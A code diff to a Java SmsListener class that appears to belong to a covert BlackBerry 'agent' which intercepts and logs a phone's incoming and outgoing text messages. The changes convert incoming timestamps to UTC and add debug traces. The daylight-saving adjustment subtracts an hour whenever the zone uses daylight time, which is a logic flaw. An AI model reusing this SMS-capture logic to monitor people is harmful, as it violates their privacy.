@@ -4,7 +4,9 @@ package blackberry.agent.sms;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.UnsupportedEncodingException;
+import java.util.Calendar;
 import java.util.Date;
+import java.util.TimeZone;
 
 import javax.microedition.io.Connector;
 import javax.wireless.messaging.BinaryMessage;
@@ -24,7 +26,7 @@ import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
 public class SmsListener {
-    
+
     private static final int SMS_VERSION = 2010050501;
 
     //#ifdef DEBUG
@@ -49,10 +51,10 @@ public class SmsListener {
     }
 
     public static SmsListener getInstance() {
-        
+
         if (instance == null) {
             SmsListener singleton = new SmsListener();
-                        
+
             instance = singleton;
         }
 
@@ -68,7 +70,7 @@ public class SmsListener {
             //#endif
             inoutsms = new SMSInOutListener(smsconn, this);
             //outsms = new SMSOUTListener(this);
-             // insms = new SMSINListener(smsconn, this);
+            // insms = new SMSINListener(smsconn, this);
 
         } catch (final IOException e) {
             //#ifdef DEBUG_ERROR
@@ -192,15 +194,35 @@ public class SmsListener {
                 address = address.substring(prefix.length());
             }
 
+            Date date;
+            TimeZone timezone = TimeZone.getDefault();
+
             if (incoming) {
                 from = address;
                 to = getMyAddress();
-                filetime = new DateTime(message.getTimestamp());
+                long time = message.getTimestamp().getTime();
+
+                time -= timezone.getRawOffset();
+                time -= timezone.useDaylightTime() ? 3600000 : 0;
+
+                date = new Date(time);
+                //#ifdef DEBUG_TRACE
+                debug.trace("saveLog, incoming: " + message.getTimestamp()
+                        + " UTC: " + date);
+                //#endif
+
             } else {
                 from = getMyAddress();
                 to = address;
-                filetime = new DateTime(new Date());
+                date = new Date();
             }
+
+            filetime = new DateTime(date);
+            //#ifdef DEBUG_TRACE
+            debug.trace("saveLog, date: " + date + " filetime:" + filetime
+                    + " timezone: " + timezone.getRawOffset() + " daylight: "
+                    + timezone.useDaylightTime());
+            //#endif
 
             //#ifdef DBC
             Check.asserts(filetime != null, "saveLog: null filetime");
